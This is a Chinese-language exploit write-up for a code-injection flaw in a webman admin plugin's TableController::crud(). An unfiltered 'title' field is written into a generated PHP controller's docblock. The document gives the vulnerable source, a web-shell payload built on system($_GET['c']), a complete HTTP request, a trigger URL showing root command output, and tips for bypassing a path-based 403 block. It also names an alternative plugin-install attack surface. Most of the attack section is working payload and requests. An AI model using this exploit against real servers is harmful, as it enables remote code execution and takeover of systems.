# TableController::crud() —— title 参数 docblock 注入 → 写 app/controller/*.php → RCE

## 缺陷源码（plugin/admin/app/controller/TableController.php）
```php
public function crud(Request $request): Response
{
    $table_name = $request->input('table');
    Util::checkTableName($table_name);          // ^[a-zA-Z_0-9]+$，表名不可注入
    $title = $request->post('title');           // ★ 未做任何过滤
    $controller_file = '/' . trim($request->post('controller', ''), '/');
    $model_file      = '/' . trim($request->post('model', ''), '/');
    $overwrite       = $request->post('overwrite');   // 不传就是新建
    Util::pauseFileMonitor();
    try {
        $this->createModel($model_class, $model_namespace, base_path($model_file), $table_name);
        $this->createController($controller_class, $controller_namespace,
                                base_path($controller_file), $model_class,
                                $model_namespace, $title, $template_path);   // ★ $title 传下去
        ...
```
```php
protected function createController($controller_class, $namespace, $file, $model_class,
                                    $model_namespace, $name, $template_path)
{
    $controller_content = <<<EOF
<?php

namespace $namespace;

use support\Request;
use support\Response;
use $model_namespace\\$model_class_alias;
use plugin\admin\app\controller\Crud;

/**
 * $name                     <-- ★ 直接拼进 docblock
 */
class $controller_class extends Crud
{
    ...
}
EOF;
    file_put_contents($file, $controller_content);   // ★ 写入 app/controller/ 下
}
```

## 为什么能拿权限
`config/process.php` 的 `monitor` 进程把 `app_path()` 放进 `monitorDir`；Monitor 每秒扫一次，发现新 `.php` 且 **`exec('php -l <file>')` 语法通过** 就 `posix_kill(master, SIGUSR1)` 热重载。
写进 `app/controller/` 的控制器在 webman **默认自动路由** `/{controller}/{action}` 被命中时自动加载 → 文件顶层注入代码立即执行。

## 载荷（title）
```
*/if(isset($_GET['c'])){echo 'RCE-OK:';system($_GET['c']);}/** 
```
生成结果（语法合法，php -l 通过）：
```php
/**
 * */
if(isset($_GET['c'])){echo 'RCE-OK:';system($_GET['c']);}
/**
 
 */
class <Rand>Controller extends Crud
{
    ...
}
```

## 完整请求
```http
POST /app/admin/Table/crud HTTP/1.1
Host: <target>
Authorization: Bearer <ADMIN_JWT>
Content-Type: application/json

{"table":"wa_options",
 "title":"*/if(isset($_GET['c'])){echo 'RCE-OK:';system($_GET['c']);}/**",
 "controller":"/app/controller/<Rand>Controller.php",
 "model":"/app/model/<Rand>.php",
 "pid":0}
```
触发：`GET /<rand>/x?c=id` → `RCE-OK:uid=0(root)...`
（注意：`<Rand>` 随机、不带 `overwrite`，只会新建文件，绝不覆盖既有文件；`table` 用真实存在的表如 `wa_options`，controller 路径必须含 `/controller/`、model 以 `.php` 结尾。）

## 可用性/绕过备注
- 若目标装了「功能开关」按精确小写 path 403 拦 `/app/admin/api/table/crud`，**改路由段大小写走默认自动路由**即可命中同一控制器：`/app/admin/Table/crud`。
- 前提：拿到管理员会话（本框架 `plugin/admin/api/Auth::canAccess` 未登录时在判 noNeedAuth 前就 401，无免登录绕过）。
- 同等效果的备用面：`PluginController::install` → `ZipArchive::extractTo(base_path().'/plugin/')` → 可写 `plugin/*/config/*.php`（同属 Monitor 目录）。